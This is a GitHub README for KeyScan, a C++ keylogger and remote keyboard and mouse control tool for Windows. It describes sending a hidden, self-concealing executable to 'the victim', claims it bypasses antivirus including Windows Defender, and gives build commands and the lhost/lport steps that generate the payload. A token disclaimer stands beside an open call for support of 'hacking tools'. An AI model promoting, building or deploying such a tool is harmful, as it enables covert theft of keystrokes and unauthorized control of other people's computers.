# KeyScan
KeyScan is a C++ open source explanation tool targeting windows operating system. it allows you to send keyboard events, mouse events and capture keystrokes (keylogger).!

Before you keep on reading please support my hard work by leaving a star and follow up if you want me to keep creating hacking tools like this.!!
# Disclaimer
It should be highly noted that this tool wasn't made with the intention to make or cause any damages or any illegal usage. By using KeyScan you accept that you'll be held responsible for improper usage and not the author.

# Features
* The program can bypass any antivirus including windows 10 and windows 11 defender ‚úÖÔ∏è.
* Control keyboard remotely ‚úÖÔ∏è.
* Control mouse remotely ‚úÖÔ∏è.
* Keylogging ‚úÖÔ∏è.
* Automatically hide the exe file on first run ‚úÖÔ∏è
* Invisible ‚úÖÔ∏è

# Features working on
* SSL/TLS ‚ùåÔ∏è
* Shell features ‚ùåÔ∏è

# How does it work.?!
In this repository, the folder [keyscan](keyscan) contains the source codes that needs to be compiled before sending it to the victim. Just install the requirements and KeyScan will automatically compile it for you.!!
When the victim opens the malicious executable file, the window will be invisible to the victim and the program will also make itself hidden (meaning it will make the executable file hidden). At the other side the attacker will be waiting for the victim to open the file, after opened, then a session is opened.

# Platforms
* Linux ‚úÖÔ∏è
* Windows ‚úÖÔ∏è
* Termux (Android) ‚úÖÔ∏è

# Requirements
* GCC and MingWG on Linux and Termux
* MingWG on Windows

# Installation on Linux and Termux
```
git clone https://github.com/4anonz/KeyScan.git
cd KeyScan
g++ main.cpp -o keyscan
./keyscan
```
# Installation on Windows
```
g++ main.cpp -o keyscan.exe -lws2_32
.\keyscan.exe
```
# Sending the exe file to the victim
If you're working on Linux you need to install mingw for compiling C++ windows programs on linux.
install it using:
```
sudo apt-get install mingw-w64
```
And on termux using:
```
git clone https://github.com/mirror/mingw-w64.git
cd mingw-w64
./configure --prefix=$PREFIX --without-crt
DESTDIR=$PREFIX make install
```
# How to use KeyScan?.
Set the local ip and port number using these commands.
```
lhost ip
lport port number
```
Then type exploit and the program will generate the .exe file that needs shall be send to the victim.
